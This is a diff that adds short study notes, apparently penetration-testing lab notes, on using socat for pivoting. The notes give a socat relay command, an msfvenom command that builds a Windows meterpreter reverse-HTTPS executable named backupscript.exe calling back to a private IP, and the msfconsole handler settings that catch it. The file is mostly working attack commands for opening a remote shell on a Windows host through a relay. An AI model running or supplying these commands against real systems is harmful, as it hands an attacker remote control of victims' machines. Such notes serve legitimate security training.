@@ -1,0 +1,31 @@
+:PROPERTIES:
+:ID:       6702f357-4e94-4218-8739-43f07ac0e7c4
+:END:
+#+title: socat
+#+OPTIONS: toc:3 ^:{}
+
+* TOC :toc_3:
+- [[#socat-revshell][Socat Revshell]]
+  - [[#start-listener][Start Listener]]
+  - [[#create-windows-payload][Create Windows Payload]]
+  - [[#msfconsole][msfconsole]]
+- [[#socat-bind-shell][socat bind shell]]
+
+* Socat Revshell
+- bidirectional relay tool to create pipe sockets between 2 independent network channels w/out needing to use SSH tunneling.
+- acts as redirector that can listen on one host & port & fwd data to another IP addr & port
+
+** Start Listener
+- ~socat TCP4-LISTEN:8080, fork TCP4:10.10.14.18:80~ (webserver)
+
+** Create Windows Payload
+- ~msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8000~
+
+** msfconsole
+- ~use exploit/multi/handler~
+- ~set payload windows/x64/meterpreter/reverse_https~
+- ~set lhost 0.0.0.0~
+- ~set lport 80~
+
+* socat bind shell
+- windows server will start listener & bind to port
